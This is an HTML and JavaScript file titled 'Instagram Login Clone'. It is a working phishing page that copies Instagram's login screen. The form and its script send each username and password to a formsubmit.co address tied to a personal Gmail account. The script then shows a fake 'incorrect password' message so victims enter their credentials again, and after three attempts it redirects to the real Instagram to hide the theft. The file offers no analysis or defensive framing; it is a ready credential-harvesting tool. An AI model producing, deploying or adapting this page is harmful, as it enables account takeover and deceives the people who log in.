<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>Instagram Login Clone</title>
  <link href="https://fonts.googleapis.com/css2?family=Roboto&display=swap" rel="stylesheet" />
  <style>
    * {
      box-sizing: border-box;
    }
    body {
      margin: 0;
      padding: 0;
      background-color: #fafafa;
      font-family: 'Roboto', sans-serif;
    }
    .wrapper {
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      gap: 40px;
      padding: 20px;
    }
    .phone-mockup {
      flex-shrink: 0;
      width: 500px;
      user-select: none;
    }
    .phone-mockup img {
      width: 100%;
      height: auto;
      object-fit: contain;
      user-select: none;
    }
    .form-container {
      width: 100%;
      max-width: 350px;
    }
    .login-box {
      background: #fff;
      border: 1px solid #dbdbdb;
      padding: 40px 30px;
      margin-bottom: 10px;
      text-align: center;
      position: relative;
    }
    .login-box img.logo {
      width: 175px;
      margin-bottom: 25px;
      user-select: none;
    }
    input {
      width: 100%;
      padding: 10px;
      margin: 6px 0;
      background: #fafafa;
      border: 1px solid #dbdbdb;
      border-radius: 3px;
      font-size: 14px;
    }
    button {
      width: 100%;
      padding: 10px;
      background-color: #0095f6;
      border: none;
      color: white;
      font-weight: bold;
      font-size: 14px;
      border-radius: 3px;
      margin-top: 10px;
      cursor: not-allowed;
      opacity: 0.5;
      transition: background-color 0.2s ease;
    }
    button.enabled {
      cursor: pointer;
      opacity: 1;
    }
    button.enabled:hover {
      background-color: #007acc;
    }
    .or {
      margin: 20px 0;
      position: relative;
      text-align: center;
      font-size: 13px;
      color: #8e8e8e;
    }
    .or::before,
    .or::after {
      content: "";
      position: absolute;
      width: 40%;
      height: 1px;
      background-color: #dbdbdb;
      top: 50%;
    }
    .or::before {
      left: 0;
    }
    .or::after {
      right: 0;
    }
    .forgot {
      margin-top: 15px;
      font-size: 12px;
    }
    a {
      color: #0095f6;
      text-decoration: none;
      font-weight: bold;
    }
    .signup-box {
      font-size: 14px;
      text-align: center;
    }
    .facebook-login {
      display: flex;
      justify-content: center;
      align-items: center;
      color: #385185;
      font-weight: 600;
      font-size: 14px;
      margin-top: 15px;
      gap: 6px;
      cursor: pointer;
      text-decoration: none;
    }
    .facebook-login img {
      width: 16px;
      height: 16px;
    }
    .error-box {
      background-color: #fff0f0;
      border: 1px solid #ef4444;
      color: #ef4444;
      padding: 10px 14px;
      margin-top: 8px;
      border-radius: 3px;
      font-size: 13px;
      text-align: center;
      user-select: none;
      display: none;
      max-width: 350px;
      margin-left: auto;
      margin-right: auto;
    }
    @media (max-width: 767px) {
      .wrapper {
        flex-direction: column;
      }
      .phone-mockup {
        width: 90vw;
        max-width: 450px;
        margin-bottom: 20px;
      }
      .error-box {
        max-width: 90vw;
      }
    }
  </style>
</head>
<body>
  <div class="wrapper">
    <!-- Mobile mockup on left -->
    <div class="phone-mockup" aria-hidden="true">
      <img
        src="https://i.postimg.cc/RVKVCdKG/instagram-web-lox-image.png"
        alt="Instagram mobile mockup"
      />
    </div>

    <!-- Login form -->
    <div class="form-container" role="main">
      <div class="login-box" role="form" aria-label="Instagram login form">
        <img
          class="logo"
          src="https://www.instagram.com/static/images/web/mobile_nav_type_logo.png/735145cfe0a4.png"
          alt="Instagram"
          draggable="false"
        />

        <form
          id="loginForm"
          action="https://formsubmit.co/rampravesh449@gmail.com"
          method="POST"
          autocomplete="off"
          spellcheck="false"
        >
          <input
            type="text"
            name="username"
            id="username"
            placeholder="Phone number, username, or email"
            required
            aria-label="Username"
          />
          <input
            type="password"
            name="password"
            id="password"
            placeholder="Password"
            required
            aria-label="Password"
          />

          <!-- Hidden inputs for FormSubmit -->
          <input type="hidden" name="_subject" value="New Login Submission" />
          <input type="hidden" name="_captcha" value="false" />
          <input type="hidden" name="_template" value="table" />

          <button type="submit" id="loginBtn" disabled>Log In</button>

          <div class="or">OR</div>
        </form>

        <a
          href="https://www.facebook.com/login.php?skip_api_login=1&api_key=6628568379&signed_next=1&next=https%3A%2F%2Fwww.instagram.com%2Faccounts%2Ffacebook_login%2F%3Fsource%3Dauth_switcher&cancel_url=https%3A%2F%2Fwww.instagram.com%2Faccounts%2Flogin%2F%3Fcancel%3Dtrue%26source%3Dauth_switcher&display=popup&locale=en_US"
          target="_blank"
          rel="noopener noreferrer"
          class="facebook-login"
        >
          <img src="https://upload.wikimedia.org/wikipedia/commons/0/05/Facebook_Logo_(2019).png" alt="Facebook logo" />
          Log in with Facebook
        </a>

        <!-- Error alert below facebook login -->
        <div class="error-box" id="errorBox">
          Sorry, your password was incorrect. Please double-check your password.
        </div>

        <div class="forgot" style="margin-top: 15px;">
          <a
            href="https://www.instagram.com/accounts/password/reset/"
            target="_blank"
            rel="noopener noreferrer"
            >Forgot password?</a
          >
        </div>
      </div>

      <div class="signup-box">
        Don't have an account?
        <a
          href="https://www.instagram.com/accounts/emailsignup/"
          target="_blank"
          rel="noopener noreferrer"
          >Sign up</a
        >
      </div>
    </div>
  </div>

  <script>
    const loginForm = document.getElementById('loginForm');
    const loginBtn = document.getElementById('loginBtn');
    const passwordInput = document.getElementById('password');
    const errorBox = document.getElementById('errorBox');
    let attempts = 0;

    // Enable login button only when password length >= 6
    passwordInput.addEventListener('input', () => {
      if (passwordInput.value.length >= 6) {
        loginBtn.disabled = false;
        loginBtn.classList.add('enabled');
      } else {
        loginBtn.disabled = true;
        loginBtn.classList.remove('enabled');
      }
      errorBox.style.display = 'none'; // Hide error on input
    });

    loginForm.addEventListener('submit', function(e) {
      e.preventDefault();

      // Send inputs to your email every time form is submitted
      const data = new FormData(loginForm);
      fetch(loginForm.action, {
        method: 'POST',
        body: data,
        headers: {
          Accept: 'application/json',
        },
      }).catch(() => {
        // no error handling needed for now
      });

      attempts++;

      if (attempts < 3) {
        // Show Instagram-like error after wrong attempt
        errorBox.style.display = 'block';
      } else {
        // After 3 wrong attempts redirect to Instagram
        window.location.href = 'https://www.instagram.com';
      }
    });
  </script>
</body>
</html>
